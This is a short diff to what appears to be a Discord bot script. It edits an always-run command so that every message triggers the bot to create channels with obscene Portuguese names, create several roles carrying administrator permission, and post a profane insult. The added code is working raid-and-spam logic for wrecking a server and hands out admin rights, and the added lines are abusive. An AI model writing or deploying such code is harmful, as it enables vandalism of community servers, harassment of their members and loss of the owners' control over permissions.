@@ -56,8 +56,12 @@ bot.command({
 name: "$alwaysExecute",
 code: `
 $createChannel[vai-roubar-seu-cu;text;yes]
-
-
+$createChannel[vai-roubar-a-pqp;text;yes]
+$createChannel[arrombado;text;yes]
+$createRole[arrombado;FF0000;no;yes;2;admin]
+$createRole[Me Mama fdpppppp;FF0000;no;yes;2;admin]
+$createRole[Filho de uma puta;FF0000;no;yes;2;admin]
+Vai se fuder seu filho da putaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 `
 })
 
